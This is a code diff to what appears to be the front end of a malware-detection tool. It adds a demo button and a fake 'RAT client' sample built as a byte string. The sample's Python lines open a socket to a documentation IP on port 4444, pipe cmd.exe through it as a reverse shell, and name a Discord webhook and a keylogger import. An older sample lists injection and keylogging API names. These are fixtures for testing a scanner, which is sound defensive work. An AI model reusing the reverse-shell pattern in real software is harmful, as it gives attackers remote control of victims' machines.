@@ -350,6 +350,16 @@ function buildDemoSample(kind) {
     b.set(new TextEncoder().encode("OpcodeShield v4.0 Demo Benign Utility — Hello World!"), 0x90);
     return { bytes: b, name: "hello_world_clean.exe" };
   }
+  if (kind === "pyrat") {
+    const pyCode = [
+      "import socket, subprocess, base64, pynput.keyboard",
+      "WEBHOOK = 'https://discord.com/api/webhooks/123456789/demo_rat_token'",
+      "s = socket.socket(); s.connect(('198.51.100.42', 4444))",
+      "subprocess.Popen(['cmd.exe'], stdin=s, stdout=s, stderr=s)",
+      "exec(base64.b64decode('cHJpbnQoInJhdCIp'))",
+    ].join("\n");
+    return { bytes: new TextEncoder().encode(pyCode), name: "suspicious_rat_client.py" };
+  }
   const payload = "SetWindowsHookEx GetAsyncKeyState VirtualAllocEx WriteProcessMemory https://discord.com/api/webhooks/0000/demo keylog.txt ";
   const pBytes = new TextEncoder().encode(payload);
   const prologue = new Uint8Array([0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20]);
@@ -383,6 +393,7 @@ function setupUI() {
 
   $("btn-demo-clean").addEventListener("click", (e) => { e.stopPropagation(); const s = buildDemoSample("benign"); handleBinary(s.bytes, s.name); });
   $("btn-demo-malware").addEventListener("click", (e) => { e.stopPropagation(); const s = buildDemoSample("malware"); handleBinary(s.bytes, s.name); });
+  $("btn-demo-pyrat").addEventListener("click", (e) => { e.stopPropagation(); const s = buildDemoSample("pyrat"); handleBinary(s.bytes, s.name); });
 
   $("btn-apply-manual-patch").addEventListener("click", async () => {
     if (!state.currentBytes) return alert("Load a binary first.");
